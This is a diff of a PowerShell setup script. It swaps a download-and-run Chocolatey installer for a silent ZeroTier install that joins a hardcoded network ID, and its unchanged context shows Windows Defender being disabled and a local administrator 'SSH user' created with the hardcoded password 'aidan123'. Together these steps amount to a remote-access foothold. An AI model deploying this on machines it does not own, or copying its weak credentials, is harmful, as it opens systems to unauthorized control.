@@ -4,14 +4,11 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
-# Install Chocolatey if not already installed
-$chocoInstallPath = "$env:SystemDrive\ProgramData\chocolatey"
-if (-not (Test-Path $chocoInstallPath)) {
-    Set-ExecutionPolicy Bypass -Scope Process -Force
-    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
-}
-
-# Proceed with the rest of the script only if running with administrator privileges
+# Download and Install ZeroTier One silently
+$zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
+$zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
+Invoke-WebRequest -Uri $zeroTierMsiUrl -OutFile $zeroTierMsiPath
+Start-Process "msiexec.exe" -ArgumentList "/i `"$zeroTierMsiPath`" /quiet" -Wait
 
 # Disable Windows Defender Antivirus
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -44,8 +41,15 @@ $password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
 New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
 Add-LocalGroupMember -Group "Administrators" -Member $userName
 
+# Join the specified ZeroTier network
+# Ensure the ZeroTier service is running before attempting to join a network
+Start-Service -Name "ZeroTierOneService"
+$networkId = "af78bf9436d39eb1" # Replace with your network ID
+Start-Sleep -Seconds 5 # Give some time for the ZeroTier service to start
+& "C:\Program Files\ZeroTier\One\zerotier-cli.exe" join $networkId
+
 # Re-enable Windows Defender Antivirus
 Set-MpPreference -DisableRealtimeMonitoring $false
 
-Write-Host "Setup complete. SSH user created and configured."
+Write-Host "Setup complete. SSH user created and configured. Joined ZeroTier network: $networkId."
 Write-Host "Windows Defender Antivirus has been re-enabled."
